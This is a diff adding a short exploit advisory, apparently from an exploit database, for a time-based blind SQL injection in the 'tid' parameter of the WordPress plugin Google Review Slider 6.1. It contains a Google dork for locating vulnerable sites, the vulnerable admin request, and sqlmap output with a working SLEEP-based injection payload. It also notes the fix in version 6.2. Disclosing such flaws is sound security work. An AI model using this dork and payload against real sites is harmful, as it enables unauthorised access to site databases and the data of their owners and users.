@@ -1,0 +1,30 @@
+# Exploit Title: Wordpress Plugin Google Review Slider 6.1 - 'tid' SQL Injection
+# Google Dork: inurl:"/wp-content/plugins/wp-google-places-review-slider/"
+# Date: 2019-07-02
+# Exploit Author: Princy Edward
+# Exploit Author Blog : https://prinyedward.blogspot.com/
+# Vendor Homepage: https://wordpress.org/plugins/wp-google-places-review-slider/
+# Version: 6.1
+# Tested on: Apache/2.2.24 (CentOS)
+# CVE : 
+
+#POC :
+
+GET/wp-admin/admin.php?page=wp_google-templates_posts&tid=1&_wpnonce=***
+&taction=edit HTTP/1.1
+
+#SQLMAP Result :
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: tid (GET)
+Type: time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: page=wp_google-templates_posts&tid=1 AND (SELECT 5357 FROM
+(SELECT(SLEEP(5)))kHQz)&_wpnonce=***&taction=edit
+
+# Changeset:
+# Issue fixed in version 6.2
+# https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2180197%40wp-google-places-review-slider&old=2163061%40wp-google-places-review-slider&sfp_email=&sfph_mail=
+
+Cheers!
+PrincyEdward
